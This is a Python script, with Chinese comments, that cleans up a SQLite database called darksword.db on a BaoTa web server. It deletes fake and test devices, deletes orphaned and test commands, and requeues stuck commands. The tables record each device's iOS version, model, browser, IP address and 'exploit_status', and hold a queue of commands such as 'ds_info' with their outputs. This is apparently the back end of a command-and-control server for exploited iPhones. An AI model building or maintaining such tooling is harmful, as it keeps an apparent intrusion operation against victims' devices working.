# -*- coding: utf-8 -*-
# ========================================================
# v20.4 DB PRE-DEPLOY CLEANUP (列名从 PRAGMA 实查：devices 没有 last_cmd_idle_at 那一列, commands 有 id/device_uuid/command/status/output/created_at/executed_at )
# 只在宝塔服务器运行（对应 darksword.db = /www/wwwroot/coruna/server/darksword.db ）
# 1. 删脏设备：dev-/ios-v19-/ios-v203- 前缀 / UUID<30 / 无 os_version 且无 device_model（假设备模拟机）
# 2. 删脏命令：id>=99999 隔离测试行 / output 包含 V20/HTTPS-v20/test v20/v20.1/v20.2/v20.3 历史测试串
# 3. 重置 id=100019 ds_info 永久 executing 回 pending 清 output（释放 MAX_CONCURRENT=1 槽）
# 4. 重置所有 executing 超过 60s 的命令（看门狗生效前的历史遗留卡死）回 pending
# ========================================================
import sqlite3, time, sys, os

DB = 'darksword.db' if os.path.exists('darksword.db') else '/www/wwwroot/coruna/server/darksword.db'
print('USE DB:', DB)
conn = sqlite3.connect(DB)
c = conn.cursor()

# -------- 1. before snapshot --------
print()
print('======== BEFORE CLEANUP ========')
devs = c.execute('SELECT COUNT(*) FROM devices').fetchone()[0]
cmds = c.execute('SELECT COUNT(*) FROM commands').fetchone()[0]
ex  = c.execute('SELECT COUNT(*) FROM commands WHERE status=?', ('executing',)).fetchone()[0]
pen = c.execute('SELECT COUNT(*) FROM commands WHERE status=?', ('pending',)).fetchone()[0]
print(' devices total=%d, commands total=%d, executing=%d, pending=%d' % (devs, cmds, ex, pen))
print(' latest 10 devices:')
rs = c.execute('''SELECT device_uuid, os_version, device_model, browser_name, ip, datetime(last_seen,'unixepoch','localtime'), exploit_status
                  FROM devices ORDER BY last_seen DESC LIMIT 10''').fetchall()
for r in rs:
    print('   UUID=%-22s... OS=%-8s MDL=%-18s BR=%-12s IP=%-15s LAST=%s EXP=%s' % (
        str(r[0])[:22], str(r[1] or 'null'), str(r[2] or 'null'), str(r[3] or 'null'), str(r[4] or '?'), r[5], r[6]))
print(' latest 10 commands:')
print('   %-6s %-20s %-22s %-12s %s' % ('ID','DEV','CMD','STATUS','OUTPUT[:80]'))
rs2 = c.execute('''SELECT id, substr(device_uuid,1,18), command, status, substr(coalesce(output,''),1,80)
                   FROM commands ORDER BY id DESC LIMIT 10''').fetchall()
for r in rs2:
    print('   %-6s %-20s %-22s %-12s %s' % tuple([str(x if x is not None else '') for x in r]))

# -------- 2. delete dirty devices --------
print()
print('======== CLEANUP ========')
dirty_prefix = ('dev-','ios-v19-','ios-v203-','ios-v20-','ios-v18-','ios-v17-','devtest-','test-')
dirty_dev_uuids = []
# (a) prefix blacklist
for p in dirty_prefix:
    n = c.execute("SELECT device_uuid FROM devices WHERE device_uuid LIKE ?", (p+'%',)).fetchall()
    dirty_dev_uuids += [x[0] for x in n]
# (b) UUID length < 30 (真设备 uuid 通常 ios-<40hex> = 45+ chars)
for row in c.execute('SELECT device_uuid FROM devices').fetchall():
    if len(row[0]) < 30:
        dirty_dev_uuids.append(row[0])
# (c) 无 os_version 且 无 device_model（模拟机几乎都没这两字段）
for row in c.execute("SELECT device_uuid FROM devices WHERE (os_version IS NULL OR os_version='') AND (device_model IS NULL OR device_model='')").fetchall():
    dirty_dev_uuids.append(row[0])
dirty_dev_uuids = list(set(dirty_dev_uuids))
del_dev_count = 0
del_cmd_for_dev_count = 0
for duuid in dirty_dev_uuids:
    r = c.execute('DELETE FROM devices WHERE device_uuid=?', (duuid,)).rowcount
    del_dev_count += r
    rc = c.execute('DELETE FROM commands WHERE device_uuid=?', (duuid,)).rowcount
    del_cmd_for_dev_count += rc
    if r > 0: print('   [DEL DEVICE] uuid=%s  (commands deleted=%d)' % (duuid[:40], rc))
print('   * 删脏设备 %d 台，连带命令 %d 条' % (del_dev_count, del_cmd_for_dev_count))

# -------- 3. delete dirty commands (test rows / test string outputs) --------
n_isoid = c.execute('DELETE FROM commands WHERE id>=99999 OR id=99999').rowcount
n_strout = c.execute("""DELETE FROM commands WHERE 
    output LIKE '%V20%' OR output LIKE '%HTTPS-%' OR output LIKE 'test v20%' 
    OR output LIKE 'v20.% POST%' OR output LIKE 'v20.% GET%' 
    OR output LIKE '%V20.3%' OR output LIKE '%v20.4%'""").rowcount
print('   * 删隔离测试id=99999行 %d 条；删脏 output 测试串命令 %d 条' % (n_isoid, n_strout))

# -------- 3.5 删 orphan 命令：commands.device_uuid 不在 devices.device_uuid 里（脏设备删了但 commands 遗留，比如 ios-0dbb/ios-5302 等，永远没人取）---------
orphan_rows = c.execute('''SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)''').fetchone()[0]
orphan_preview = c.execute('''SELECT id, substr(device_uuid,1,20), command, status FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices) ORDER BY id DESC LIMIT 15''').fetchall()
if orphan_rows > 0:
    print('   ⚠️  发现 %d 条 orphan commands（device_uuid 不在 devices 表，永远没人执行，必须删）' % orphan_rows)
    for r in orphan_preview:
        print('     orphan sample: id=%d dev=%s... cmd=%s status=%s' % tuple([str(x if x is not None else '') for x in r]))
    orphan_del = c.execute('DELETE FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)').rowcount
    print('   * 删 orphan commands %d 条' % orphan_del)

# -------- 4. 重置 executing 卡死命令 --------
stuck_now = int(time.time()) - 60   # created_at (unix seconds) >60s ago AND executing
n_stuck = c.execute("SELECT id, command, device_uuid FROM commands WHERE status='executing' AND created_at < ?", (stuck_now,)).fetchall()
for st in n_stuck:
    print('   [RESET EXECUTING→PENDING] id=%d cmd=%s dev=%s...' % (st[0], st[1], str(st[2])[:18]))
c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE status='executing' AND created_at < ?", (stuck_now,))
# 显式重置用户指明 id=100019 (ds_info 永久 executing)
c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE id=100019 AND status='executing'")
print('   * 重置 executing 超过 60s 卡死命令 %d 条回 pending + id=100019 ds_info 单独重置' % len(n_stuck))

# -------- 5. 空 output 但 status 非 pending 的死链也 reset --------
n_dead = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE output IS NULL AND status IN ('completed','failed','deferred')").rowcount
print('   * 重置空 output 但非 pending 死链命令 %d 条' % n_dead)

conn.commit()
print()
print('======== AFTER CLEANUP ========')
devs = c.execute('SELECT COUNT(*) FROM devices').fetchone()[0]
cmds = c.execute('SELECT COUNT(*) FROM commands').fetchone()[0]
ex  = c.execute('SELECT COUNT(*) FROM commands WHERE status=?', ('executing',)).fetchone()[0]
pen = c.execute('SELECT COUNT(*) FROM commands WHERE status=?', ('pending',)).fetchone()[0]
ok  = c.execute('SELECT COUNT(*) FROM commands WHERE status IN (?,?)', ('completed','failed')).fetchone()[0]
print(' devices total=%d, commands total=%d, executing=%d, pending=%d, completed/failed=%d' % (devs, cmds, ex, pen, ok))
print(' latest 8 commands:')
print('   %-6s %-20s %-22s %-12s %s' % ('ID','DEV','CMD','STATUS','OUTPUT[:120]'))
rs3 = c.execute('''SELECT id, substr(device_uuid,1,18), command, status, substr(coalesce(output,''),1,120)
                   FROM commands ORDER BY id DESC LIMIT 8''').fetchall()
for r in rs3:
    print('   %-6s %-20s %-22s %-12s %s' % tuple([str(x if x is not None else '') for x in r]))
print()
print(' remaining devices:')
rs4 = c.execute('''SELECT device_uuid, os_version, device_model, browser_name, ip, datetime(last_seen,'unixepoch','localtime'), exploit_status
                  FROM devices ORDER BY last_seen DESC''').fetchall()
for r in rs4:
    print('   UUID=%-22s... OS=%-8s MDL=%-18s BR=%-12s IP=%-15s LAST=%s EXP=%s' % (
        str(r[0])[:22], str(r[1] or 'null'), str(r[2] or 'null'), str(r[3] or 'null'), str(r[4] or '?'), r[5], r[6]))
conn.close()
print()
print('✅ DB CLEANUP DONE (v20.4)')
